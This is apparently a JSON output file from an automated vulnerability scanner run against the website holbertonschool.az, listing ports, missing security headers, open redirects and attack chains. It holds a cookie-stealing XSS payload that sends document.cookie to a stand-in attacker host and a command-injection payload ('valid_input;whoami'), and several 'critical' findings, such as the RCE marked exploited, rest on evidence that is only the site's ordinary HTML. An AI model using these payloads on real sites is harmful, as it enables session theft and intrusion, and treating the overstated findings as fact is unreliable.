@@ -1,0 +1,384 @@
+{
+  "name": "20260525_202900",
+  "target": "http://holbertonschool.az",
+  "domain": "holbertonschool.az",
+  "threads": 10,
+  "timeout": 20,
+  "findings": [
+    {
+      "subdomain": "www.holbertonschool.az",
+      "ips": [
+        "15.236.205.206"
+      ],
+      "cname": "holbertonschool.az.",
+      "source": "dns_bruteforce",
+      "status": "alive"
+    },
+    {
+      "port": 22,
+      "state": "open",
+      "service": "SSH",
+      "banner": "",
+      "risk": "medium"
+    },
+    {
+      "port": 80,
+      "state": "open",
+      "service": "HTTP",
+      "banner": "HTTP/1.1 301 Moved Permanently\r",
+      "risk": "medium"
+    },
+    {
+      "port": 443,
+      "state": "open",
+      "service": "HTTPS",
+      "banner": "HTTP/1.1 400 Bad Request\r",
+      "risk": "low"
+    },
+    {
+      "module": "Technology Fingerprinting",
+      "severity": "info",
+      "data": {
+        "url": "http://holbertonschool.az",
+        "status_code": 200,
+        "server": [
+          "Nginx 1.24.0"
+        ],
+        "cms_frameworks": [
+          "Next.js"
+        ],
+        "javascript_libs": [
+          "None detected"
+        ],
+        "security_headers": {
+          "Strict-Transport-Security": "\u274c MISSING \u2014 Protects against MITM / protocol downgrade",
+          "X-Frame-Options": "\u274c MISSING \u2014 Prevents clickjacking",
+          "X-Content-Type-Options": "\u274c MISSING \u2014 Prevents MIME-type sniffing",
+          "Content-Security-Policy": "\u274c MISSING \u2014 Mitigates XSS & data injection",
+          "X-XSS-Protection": "\u274c MISSING \u2014 Old-browser XSS filter",
+          "Referrer-Policy": "\u274c MISSING \u2014 Controls referrer leakage",
+          "Permissions-Policy": "\u274c MISSING \u2014 Restricts browser feature access"
+        },
+        "cookie_issues": [
+          "None detected"
+        ],
+        "raw_headers": {
+          "Server": "nginx/1.24.0",
+          "Date": "Mon, 25 May 2026 16:49:18 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Transfer-Encoding": "chunked",
+          "Connection": "keep-alive",
+          "Vary": "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding",
+          "X-Powered-By": "Next.js",
+          "Cache-Control": "private, no-cache, no-store, max-age=0, must-revalidate",
+          "Content-Encoding": "gzip"
+        }
+      }
+    },
+    {
+      "module": "Web Crawler",
+      "severity": "info",
+      "data": {
+        "pages": [
+          "http://holbertonschool.az"
+        ],
+        "forms": [],
+        "endpoints": [],
+        "secrets": [],
+        "js_endpoints": [],
+        "js_graphql": []
+      }
+    },
+    {
+      "type": "AWS S3",
+      "url": "http://holbertonschool.s3.amazonaws.com",
+      "status": "Exists (Access Denied)",
+      "severity": "info"
+    },
+    {
+      "type": "Infrastructure",
+      "severity": "info",
+      "evidence": "ASN: AS16509",
+      "detail": "Company: 15.236.0.0/15"
+    },
+    {
+      "type": "IP Prefixes",
+      "severity": "info",
+      "evidence": "Found 20668 CIDR blocks",
+      "detail": "3.165.203.0/24, 149.19.6.0/24, 2600:9000:24bb::/48, 3.175.206.0/23, 2600:1f60:1080::/48, 2600:1f60:60c0::/48, 2600:9000:1e49::/48, 216.244.38.0/23, 170.85.212.0/24, 2600:1f60:6000::/40..."
+    },
+    {
+      "url": "http://holbertonschool.az?redirect=http://evil.example.com",
+      "parameter": "redirect",
+      "type": "Open Redirect",
+      "severity": "medium",
+      "evidence": "Redirects to: https://holbertonschool.az/?redirect=http://evil.example.com",
+      "detail": "Open redirect via 'redirect' parameter",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 6.1,
+      "remediation": "Validate redirect URLs against a whitelist. Do not use user-controlled data in redirect headers."
+    },
+    {
+      "url": "http://holbertonschool.az?return=http://evil.example.com",
+      "parameter": "return",
+      "type": "Open Redirect",
+      "severity": "medium",
+      "evidence": "Redirects to: https://holbertonschool.az/?return=http://evil.example.com",
+      "detail": "Open redirect via 'return' parameter",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 6.1,
+      "remediation": "Validate redirect URLs against a whitelist. Do not use user-controlled data in redirect headers."
+    },
+    {
+      "url": "http://holbertonschool.az?next=http://evil.example.com",
+      "parameter": "next",
+      "type": "Open Redirect",
+      "severity": "medium",
+      "evidence": "Redirects to: https://holbertonschool.az/?next=http://evil.example.com",
+      "detail": "Open redirect via 'next' parameter",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 6.1,
+      "remediation": "Validate redirect URLs against a whitelist. Do not use user-controlled data in redirect headers."
+    },
+    {
+      "url": "http://holbertonschool.az?url=http://evil.example.com",
+      "parameter": "url",
+      "type": "Open Redirect",
+      "severity": "medium",
+      "evidence": "Redirects to: https://holbertonschool.az/?url=http://evil.example.com",
+      "detail": "Open redirect via 'url' parameter",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 6.1,
+      "remediation": "Validate redirect URLs against a whitelist. Do not use user-controlled data in redirect headers."
+    },
+    {
+      "url": "http://holbertonschool.az?to=http://evil.example.com",
+      "parameter": "to",
+      "type": "Open Redirect",
+      "severity": "medium",
+      "evidence": "Redirects to: https://holbertonschool.az/?to=http://evil.example.com",
+      "detail": "Open redirect via 'to' parameter",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 6.1,
+      "remediation": "Validate redirect URLs against a whitelist. Do not use user-controlled data in redirect headers."
+    },
+    {
+      "url": "http://holbertonschool.az?goto=http://evil.example.com",
+      "parameter": "goto",
+      "type": "Open Redirect",
+      "severity": "medium",
+      "evidence": "Redirects to: https://holbertonschool.az/?goto=http://evil.example.com",
+      "detail": "Open redirect via 'goto' parameter",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 6.1,
+      "remediation": "Validate redirect URLs against a whitelist. Do not use user-controlled data in redirect headers."
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Missing Header: Content-Security-Policy",
+      "severity": "high",
+      "detail": "CSP prevents XSS and data injection attacks by controlling allowed resource sources.",
+      "evidence": "Header 'Content-Security-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Add a strict CSP: 'default-src \\'self\\'; script-src \\'self\\'; object-src \\'none\\';'"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Missing Header: Strict-Transport-Security",
+      "severity": "high",
+      "detail": "HSTS forces HTTPS connections and prevents SSL-stripping attacks.",
+      "evidence": "Header 'Strict-Transport-Security' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Missing Header: X-Frame-Options",
+      "severity": "medium",
+      "detail": "Missing X-Frame-Options allows clickjacking attacks (embedding site in iframes).",
+      "evidence": "Header 'X-Frame-Options' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 6.1,
+      "remediation": "Add: X-Frame-Options: DENY  (or use CSP frame-ancestors directive instead)"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Missing Header: X-Content-Type-Options",
+      "severity": "low",
+      "detail": "Missing header allows MIME-type sniffing, enabling content injection.",
+      "evidence": "Header 'X-Content-Type-Options' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Add: X-Content-Type-Options: nosniff"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Missing Header: Referrer-Policy",
+      "severity": "low",
+      "detail": "Missing Referrer-Policy may leak sensitive URL information to third parties.",
+      "evidence": "Header 'Referrer-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Add: Referrer-Policy: strict-origin-when-cross-origin"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Missing Header: Permissions-Policy",
+      "severity": "info",
+      "detail": "Missing Permissions-Policy allows access to powerful browser APIs (camera, mic, etc.).",
+      "evidence": "Header 'Permissions-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Permissions-Policy: geolocation=(), camera=(), microphone=()"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Missing Header: Cross-Origin-Opener-Policy",
+      "severity": "info",
+      "detail": "Missing COOP allows cross-origin pages to access window references.",
+      "evidence": "Header 'Cross-Origin-Opener-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Cross-Origin-Opener-Policy: same-origin"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Missing Header: Cross-Origin-Resource-Policy",
+      "severity": "info",
+      "detail": "Missing CORP allows cross-origin pages to load this site's resources.",
+      "evidence": "Header 'Cross-Origin-Resource-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Cross-Origin-Resource-Policy: same-origin"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Information Disclosure: X-Powered-By",
+      "severity": "info",
+      "detail": "Server technology disclosure may aid attacker fingerprinting.",
+      "evidence": "X-Powered-By: Next.js",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Remove X-Powered-By header from all responses."
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "Information Disclosure: Server",
+      "severity": "info",
+      "detail": "Server version disclosure may aid attacker fingerprinting.",
+      "evidence": "Server: nginx/1.24.0",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Configure web server to omit or genericize the Server header."
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "RCE \u2014 Remote Code Execution (Exploited)",
+      "severity": "critical",
+      "cvss": 10.0,
+      "parameter": "cmd",
+      "payload": "valid_input;whoami",
+      "detail": "Command 'whoami' executed. Output detected: 'administrator'",
+      "evidence": "<!DOCTYPE html><html lang=\"en\"><head><meta charSet=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"/_next/static/css/599d9074d725e54e.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/css/3544e6ede56cb361.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/css/1eaee650f1ac5b2c.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/css/48f1ae16c23039b1.css\" data-precedence=\"next\"/",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.",
+      "exploit_chain": "RCE \u2192 Shell \u2192 Data Exfiltration / Lateral Movement"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "RCE \u2014 Remote Code Execution (Exploited)",
+      "severity": "critical",
+      "cvss": 10.0,
+      "parameter": "cmd",
+      "payload": "valid_input;whoami",
+      "detail": "Command 'whoami' executed. Output detected: 'administrator'",
+      "evidence": "<!DOCTYPE html><html lang=\"en\"><head><meta charSet=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"/_next/static/css/599d9074d725e54e.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/css/3544e6ede56cb361.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/css/1eaee650f1ac5b2c.css\" data-precedence=\"next\"/><link rel=\"stylesheet\" href=\"/_next/static/css/48f1ae16c23039b1.css\" data-precedence=\"next\"/",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.",
+      "exploit_chain": "RCE \u2192 Shell \u2192 Data Exfiltration / Lateral Movement"
+    },
+    {
+      "url": "http://holbertonschool.az",
+      "type": "2FA \u2014 Not Implemented",
+      "severity": "medium",
+      "cvss": 5.9,
+      "detail": "No 2FA/MFA endpoint detected.",
+      "evidence": "None of common OTP paths returned OTP form.",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Implement TOTP-based 2FA (FIDO2/WebAuthn/RFC 6238) for all accounts."
+    },
+    {
+      "url": null,
+      "type": "2FA \u2014 No Rate Limiting on OTP (Brute-force Possible)",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "Tested 7 OTP codes with no lockout or 429 response.",
+      "evidence": "No rate-limit after 7 attempts",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Enforce max 5 attempts. Add exponential backoff and account lockout."
+    },
+    {
+      "type": "CHAIN: CORS Misconfiguration \u2192 XSS \u2192 Session Theft",
+      "severity": "high",
+      "cvss": 8.8,
+      "url": "http://holbertonschool.az",
+      "module": "Chain Engine",
+      "detail": "Permissive CORS allows malicious origins to make authenticated API requests. Combined with XSS, attacker can send victim's session cookies to a controlled server via cross-origin fetch.",
+      "evidence": "Step 1: [Missing Header: Cross-Origin-Opener-Policy] at http://holbertonschool.az\nStep 2: [Missing Header: Content-Security-Policy] at http://holbertonschool.az",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Restrict CORS to trusted origins. Do not use wildcard (*) with credentials. Set HttpOnly + Secure + SameSite on cookies.",
+      "attack_steps": "CORS * \u2192 XSS on trusted subdomain \u2192 fetch(attacker.com, cookies) \u2192 Session Steal",
+      "chain_components": [
+        "Missing Header: Cross-Origin-Opener-Policy",
+        "Missing Header: Content-Security-Policy"
+      ]
+    },
+    {
+      "type": "CHAIN: Open Redirect \u2192 Phishing \u2192 OAuth Token Steal",
+      "severity": "high",
+      "cvss": 7.4,
+      "url": "http://holbertonschool.az?redirect=http://evil.example.com",
+      "module": "Chain Engine",
+      "detail": "An open redirect on the login page can be used to redirect OAuth authorization codes to an attacker-controlled server. The victim's session tokens are silently stolen.",
+      "evidence": "Step 1: [Open Redirect] at http://holbertonschool.az?redirect=http://evil.example.com\nStep 2: [XSS \u2014 Session Hijack Payload (Generated)] at http://holbertonschool.az",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Whitelist all redirect URLs. Never use user-supplied URLs in redirect_uri without strict validation. Implement state parameter in OAuth flows.",
+      "attack_steps": "Open Redirect \u2192 Craft malicious login URL \u2192 Victim clicks \u2192 OAuth code stolen",
+      "chain_components": [
+        "Open Redirect",
+        "XSS \u2014 Session Hijack Payload (Generated)"
+      ]
+    },
+    {
+      "type": "CHAIN: JWT None Algorithm \u2192 Admin Privilege Escalation",
+      "severity": "critical",
+      "cvss": 9.8,
+      "url": "http://holbertonschool.az",
+      "module": "Chain Engine",
+      "detail": "JWT with 'alg:none' or weak HS256 secret allows forging tokens with arbitrary claims (e.g. role:admin). This bypasses all role-based access controls.",
+      "evidence": "Step 1: [XSS \u2014 Session Hijack Payload (Generated)] at http://holbertonschool.az\nStep 2: [Open Redirect] at http://holbertonschool.az?redirect=http://evil.example.com",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Enforce RS256/ES256 algorithms. Reject 'none' algorithm. Validate all JWT claims server-side. Use short expiration times.",
+      "attack_steps": "JWT alg:none \u2192 Forge {role:admin} \u2192 Access admin panel \u2192 Full privilege escalation",
+      "chain_components": [
+        "XSS \u2014 Session Hijack Payload (Generated)",
+        "Open Redirect"
+      ]
+    }
+  ],
+  "start_time": "2026-05-25T20:29:00.590587"
+}
